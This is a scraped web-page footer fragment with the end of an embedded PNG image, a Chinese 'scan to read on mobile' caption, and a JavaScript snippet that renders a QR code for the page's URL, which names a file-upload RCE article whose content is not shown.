9iDEU4eRq3d0712H79VD8sD9HvL4sK/tjyynfYZ9/+bVIdNWF/U7QvJn+qqPeuGqR3n7ZQ5ybz11UX2F5jqa77q8+/LCbSCGb7z2BA4DgTw1MOJqm/BertfX0/DOsg5yn84hOnyhmY6QjLr3l4vqkDwE9SEcgisdRt++PS8vPAykxHtddwK/bSCQpwNG9CmB6H7rMOfmRfMzNNNxlt1rkHtbByM3C9HlHa1fIaQegr2++G8bSDW/1/dP4D8PpD8NbqHrcn0R5k+LeRh9deu/g9ZCekKw672nfkdz6pB+ENSHkZvvPnB/Dnl82NfhFeL0Ov7ufXs/GJ8m7wujbl6/EJKB19hrIfmVXr1rQXIQLK0WhPf68mqpi5B8eX0dBtIDN/+zJ7ANBDI1eI3f3R6kn3UQ7tMiQnRzK4TkILjKlW7vup6td33IvcyLs56ldR9SD0F9sWpc20AUbrz2BO6BXHv+h7v/AwAA//9B4aeEAAAABklEQVQDAEKEs7/1dRviAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/metasoft-mobileupload-fileupload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 